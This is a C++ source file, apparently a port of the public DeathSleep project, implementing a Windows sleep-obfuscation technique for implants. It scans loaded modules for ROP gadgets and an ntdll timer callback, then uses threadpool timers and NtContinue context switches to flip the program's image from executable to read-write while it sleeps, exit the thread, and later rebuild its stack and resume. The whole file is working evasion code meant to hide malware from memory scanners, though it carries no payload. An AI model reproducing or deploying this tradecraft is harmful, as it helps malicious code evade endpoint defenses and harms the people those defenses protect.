/*
* Title: DeathSleep
* Resources:
*	- https://github.com/janoglezcampos/DeathSleep
* Status: This may not work on Windows 11 at the line `((void(*)(PCONTEXT, BOOLEAN))ntContinue)((PCONTEXT)lpParam, FALSE);` in the "awake" function
*		  in my experience, and I have no idea for this reason yet.
*/
#include <Windows.h>
#include <Psapi.h>
#include <stdio.h>
#include "DeathSleep.hpp"

DWORD_PTR initialRsp;

DWORD dwOldProtect = 0;

CONTEXT threadCtxBackup;
CONTEXT helperCtx;
CONTEXT changePermRxCtx;
CONTEXT changePermRwCtx;

PVOID pStackBackup = nullptr;
DWORD dwStackBackupSize = 0;

PVOID pRopMemBlock = nullptr;

PTP_POOL deobfuscationPool;
PTP_POOL obfuscationPool;

PTP_CLEANUP_GROUP cleanupGroup;

CallbackInfo        captureCtxObfInfo;
CallbackInfo        changePermsRwInfo;
CallbackInfo        closePoolInfo;

CallbackInfo        captureCtxDeobfInfo;
CallbackInfo        changePermsRxInfo;

VOID InitFiletimeMs(FILETIME* ft, ULONGLONG millis) {
	ULONGLONG time = static_cast<ULONGLONG>(-static_cast<LONGLONG>(millis * 10 * 1000));
	ft->dwHighDateTime = static_cast<DWORD>(time >> 32);
	ft->dwLowDateTime = static_cast<DWORD>(time & 0xffffffff);
}

BOOL Compare(const BYTE* data, const BYTE* bMask, const char* szMask) {
	for (; *szMask; ++szMask, ++data, ++bMask) {
		if (*szMask == 'x' && *data != *bMask) {
			return FALSE;
		}
	}

	return TRUE;
}

DWORD_PTR FindPattern(DWORD_PTR dwAddr, DWORD dwLen, PBYTE bMask, PCHAR szMask) {
	for (DWORD i = 0; i < dwLen; i++) {
		if (Compare((PBYTE)(dwAddr + i), bMask, szMask)) {
			return (DWORD_PTR)(dwAddr + i);
		}
	}
	return 0;
}

DWORD_PTR FindInModule(LPCSTR lpModuleName, PBYTE bMask, PCHAR szMask) {
	HMODULE hMod = GetModuleHandleA(lpModuleName);
	if (!hMod) return 0;

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hMod;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)pDosHeader + pDosHeader->e_lfanew);
	DWORD_PTR dwSectionOffset = (DWORD_PTR)pDosHeader + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS);
	PIMAGE_SECTION_HEADER pTextSection = (PIMAGE_SECTION_HEADER)dwSectionOffset;
	DWORD_PTR dwAddr = FindPattern(
		(DWORD_PTR)pDosHeader + pTextSection->VirtualAddress,
		pTextSection->SizeOfRawData,
		bMask,
		szMask
	);
	return dwAddr;
}

PVOID FindGadget(PBYTE hdrParserFuncB, PCHAR hdrParserFuncMask) {
	DWORD_PTR ptr = 0;

	HANDLE hProcess = GetCurrentProcess();
	HMODULE* moduleList = nullptr;
	moduleList = (HMODULE*)malloc(SIZE_MODULE_LIST * sizeof(HMODULE));
	if (!moduleList) return nullptr;

	LPSTR lpModuleName = nullptr;
	DWORD dwBytesNeeded = 0;

	if (!EnumProcessModules(hProcess, moduleList, SIZE_MODULE_LIST * sizeof(HMODULE), &dwBytesNeeded)) {
		goto Cleanup;
	}
	if (dwBytesNeeded > SIZE_MODULE_LIST * sizeof(HMODULE)) {
		moduleList = (HMODULE*)realloc(moduleList, dwBytesNeeded);
		if (!EnumProcessModules(hProcess, moduleList, SIZE_MODULE_LIST * sizeof(HMODULE), &dwBytesNeeded)) {
			goto Cleanup;
		}
	}

	for (int iModule = 1; iModule < (dwBytesNeeded / sizeof(HMODULE)); iModule++) {
		lpModuleName = (LPSTR)malloc(MAX_MODULE_NAME * sizeof(CHAR));
		if (GetModuleFileNameExA(hProcess, moduleList[iModule], lpModuleName, MAX_MODULE_NAME * sizeof(CHAR)) == 0) {
			goto Cleanup;
		}
		ptr = FindInModule(lpModuleName, hdrParserFuncB, hdrParserFuncMask);
		if (ptr) break;
	}

Cleanup:
	if (moduleList)
		free(moduleList);
	if (lpModuleName)
		free(lpModuleName);
	if (hProcess)
		CloseHandle(hProcess);
	return (PVOID)ptr;
}

VOID Awake(PVOID lpParam) {
	initialRsp = GetRsp();
	if (lpParam) {
		MoveRsp(dwStackBackupSize, 0xFBFBFAFA);

		HMODULE hNtdll = GetModuleHandleA("ntdll");
		if (!hNtdll) return;

		PVOID ntContinue = nullptr;
		ntContinue = GetProcAddress(hNtdll, "NtContinue");
		if (!ntContinue) return;

		memcpy((PVOID)(initialRsp - dwStackBackupSize), pStackBackup, dwStackBackupSize);

		CloseThreadpool(deobfuscationPool);
		CloseThreadpoolCleanupGroupMembers(cleanupGroup, FALSE, nullptr);
		CloseThreadpoolCleanupGroup(cleanupGroup);
		free(pStackBackup);
		free(pRopMemBlock);

		((PCONTEXT)lpParam)->Rsp = (DWORD64)(initialRsp - dwStackBackupSize);
		((void(*)(PCONTEXT, BOOLEAN))ntContinue)((PCONTEXT)lpParam, FALSE);
	}
	else {
		MainProgram();
	}
}

VOID Rebirth(PTP_CALLBACK_INSTANCE instance, PVOID lpParam, PTP_TIMER timer) {
	UNREFERENCED_PARAMETER(instance);
	UNREFERENCED_PARAMETER(timer);

	CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)Awake, lpParam, 0, nullptr);
}

PVOID InitializeRopStack(
	PVOID pRopStackMemBlock,
	DWORD dwRopStackSize,
	PVOID pFunc,
	PVOID pArg,
	PVOID pRcxGadgetAddr,
	PVOID pShadowFixerGadgetAddr
) {
	PVOID pRopStackPtr = (PVOID)((DWORD_PTR)pRopStackMemBlock + dwRopStackSize);

	pRopStackPtr = (PVOID)((DWORD_PTR)pRopStackPtr - 8);
	*(PDWORD64)pRopStackPtr = (DWORD_PTR)pFunc;

	pRopStackPtr = (PVOID)((DWORD_PTR)pRopStackPtr - 8);
	*(PDWORD64)pRopStackPtr = (DWORD_PTR)pArg;

	pRopStackPtr = (PVOID)((DWORD_PTR)pRopStackPtr - 8);
	*(PDWORD64)pRopStackPtr = (DWORD_PTR)pRcxGadgetAddr;

	pRopStackPtr = (PVOID)((DWORD_PTR)pRopStackPtr - 48);
	*(PDWORD64)pRopStackPtr = (DWORD_PTR)pShadowFixerGadgetAddr;

	return pRopStackPtr;
}

VOID DeathSleep(ULONGLONG time) {
	DWORD dwStackFrameSize = 0xFAFBFCFD;

	RtlCaptureContext(&threadCtxBackup);

	PVOID pImageBase = (PVOID)GetModuleHandleA(NULL);
	DWORD dwImageSize = ((PIMAGE_NT_HEADERS)((DWORD_PTR)pImageBase + ((PIMAGE_DOS_HEADER)pImageBase)->e_lfanew))->OptionalHeader.SizeOfImage;

	// Get the NtContinue function pointer.
	HMODULE hNtdll = GetModuleHandleA("ntdll");
	if (!hNtdll) return;
	_NtContinue ntContinue = reinterpret_cast<_NtContinue>(GetProcAddress(hNtdll, "NtContinue"));
	if (!ntContinue) return;

	PVOID rtlpTpTimerCallback = (PVOID)FindInModule(
		"ntdll",
		(PBYTE)"\x48\x89\x5c\x24\x08\x48\x89\x74\x24\x18\x57\x48\x83\xec\x40\x48\x8b\xda\x80\x7a\x58\x00\x0f\x84",
		(PCHAR)"xxxxxxxxxxxxxx-xxxxxxxxx" // (PCHAR)"xxxxxxxxxxxxxxxxxxxxxxxx"
	);
	if (!rtlpTpTimerCallback) {
		printf("rtlpTpTimerCallback not found.\n");
		return;
	}

	PVOID pRcxGadgetAddr = FindGadget((PBYTE)"\x59\xC3", (PCHAR)"xx");
	if (!pRcxGadgetAddr) return;
	PVOID pShadowFixerGadgetAddr = FindGadget((PBYTE)"\x48\x83\xC4\x20\x5F\xC3", (PCHAR)"xxxxxx");
	if (!pShadowFixerGadgetAddr) return;

	threadCtxBackup.Rip = *(PDWORD64)(threadCtxBackup.Rsp + dwStackFrameSize);
	dwStackBackupSize = initialRsp - (threadCtxBackup.Rsp + dwStackFrameSize + 0x8);

	pStackBackup = malloc(dwStackBackupSize);
	memcpy(pStackBackup, (PVOID)(initialRsp - (DWORD64)dwStackBackupSize), dwStackBackupSize);

	// Create threadpools.
	TP_CALLBACK_ENVIRON deobfuscationEnv = { 0 };
	TP_CALLBACK_ENVIRON obfuscationEnv = { 0 };

	InitializeThreadpoolEnvironment(&obfuscationEnv);
	InitializeThreadpoolEnvironment(&deobfuscationEnv);

	obfuscationPool = CreateThreadpool(NULL);
	deobfuscationPool = CreateThreadpool(NULL);

	SetThreadpoolThreadMaximum(obfuscationPool, 1);
	SetThreadpoolThreadMaximum(deobfuscationPool, 1);

	SetThreadpoolCallbackPool(&obfuscationEnv, obfuscationPool);
	SetThreadpoolCallbackPool(&deobfuscationEnv, deobfuscationPool);

	cleanupGroup = CreateThreadpoolCleanupGroup();

	SetThreadpoolCallbackCleanupGroup(&obfuscationEnv, cleanupGroup, nullptr);
	SetThreadpoolCallbackCleanupGroup(&deobfuscationEnv, cleanupGroup, nullptr);

	InitializeCallbackInfo(&captureCtxObfInfo, RtlCaptureContext, &helperCtx);
	captureCtxObfInfo.timer = CreateThreadpoolTimer((PTP_TIMER_CALLBACK)rtlpTpTimerCallback, &captureCtxObfInfo, &obfuscationEnv);

	FILETIME dueTimeHolder = { 0 };
	InitFiletimeMs(&dueTimeHolder, 0);
	SetThreadpoolTimer(captureCtxObfInfo.timer, &dueTimeHolder, 0, 0);

	Sleep(50);

	memcpy(&changePermRwCtx, &helperCtx, sizeof(CONTEXT));

	changePermRwCtx.Rsp -= 8;
	changePermRwCtx.Rip = (DWORD_PTR)VirtualProtect;
	changePermRwCtx.Rcx = (DWORD_PTR)pImageBase;
	changePermRwCtx.Rdx = dwImageSize;
	changePermRwCtx.R8 = PAGE_READWRITE;
	changePermRwCtx.R9 = (DWORD_PTR)&dwOldProtect;

	DWORD dwRopStackSize = 1000;
	PVOID pRopMemBlock = malloc(dwRopStackSize);
	PVOID ropStackPtr = InitializeRopStack(pRopMemBlock, dwRopStackSize, ntContinue, &helperCtx, pRcxGadgetAddr, pShadowFixerGadgetAddr);

	RtlCaptureContext(&changePermRxCtx);

	changePermRxCtx.Rsp = (DWORD_PTR)ropStackPtr;
	changePermRxCtx.Rip = (DWORD_PTR)VirtualProtect;
	changePermRxCtx.Rcx = (DWORD_PTR)pImageBase;
	changePermRxCtx.Rdx = dwImageSize;
	changePermRxCtx.R8 = PAGE_EXECUTE_READWRITE;
	changePermRxCtx.R9 = (DWORD_PTR)&dwOldProtect;

	InitializeCallbackInfo(&changePermsRwInfo, ntContinue, &changePermRwCtx);
	InitializeCallbackInfo(&closePoolInfo, CloseThreadpool, obfuscationPool);
	InitializeCallbackInfo(&captureCtxDeobfInfo, RtlCaptureContext, &helperCtx);
	InitializeCallbackInfo(&changePermsRxInfo, ntContinue, &changePermRxCtx);

	changePermsRwInfo.timer = CreateThreadpoolTimer((PTP_TIMER_CALLBACK)rtlpTpTimerCallback, &changePermsRwInfo, &obfuscationEnv);
	closePoolInfo.timer = CreateThreadpoolTimer((PTP_TIMER_CALLBACK)rtlpTpTimerCallback, &closePoolInfo, &obfuscationEnv);
	captureCtxDeobfInfo.timer = CreateThreadpoolTimer((PTP_TIMER_CALLBACK)rtlpTpTimerCallback, &captureCtxDeobfInfo, &deobfuscationEnv);
	changePermsRxInfo.timer = CreateThreadpoolTimer((PTP_TIMER_CALLBACK)rtlpTpTimerCallback, &changePermsRxInfo, &deobfuscationEnv);
	PTP_TIMER rebirthTimer = nullptr;
	rebirthTimer = CreateThreadpoolTimer((PTP_TIMER_CALLBACK)Rebirth, &threadCtxBackup, &deobfuscationEnv);

	InitFiletimeMs(&dueTimeHolder, 200);
	SetThreadpoolTimer(changePermsRwInfo.timer, &dueTimeHolder, 0, 0);

	InitFiletimeMs(&dueTimeHolder, 250);
	SetThreadpoolTimer(closePoolInfo.timer, &dueTimeHolder, 0, 0);

	InitFiletimeMs(&dueTimeHolder, time - 100);
	SetThreadpoolTimer(captureCtxDeobfInfo.timer, &dueTimeHolder, 0, 0);

	InitFiletimeMs(&dueTimeHolder, time - 50);
	SetThreadpoolTimer(changePermsRxInfo.timer, &dueTimeHolder, 0, 0);

	InitFiletimeMs(&dueTimeHolder, time);
	SetThreadpoolTimer(rebirthTimer, &dueTimeHolder, 0, 0);

	ExitThread(0);
}

DWORD WINAPI MainProgram() {
	do {
		printf("DeathSleep: Start\n");
		DeathSleep(5000);
		printf("DeathSleep: Finish\n");
	} while (TRUE);

	return 0;
}

int main() {
	HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)Awake, nullptr, 0, nullptr);
	printf("Dummy thread waiting...\n");
	Sleep(INFINITE);

	return 0;
}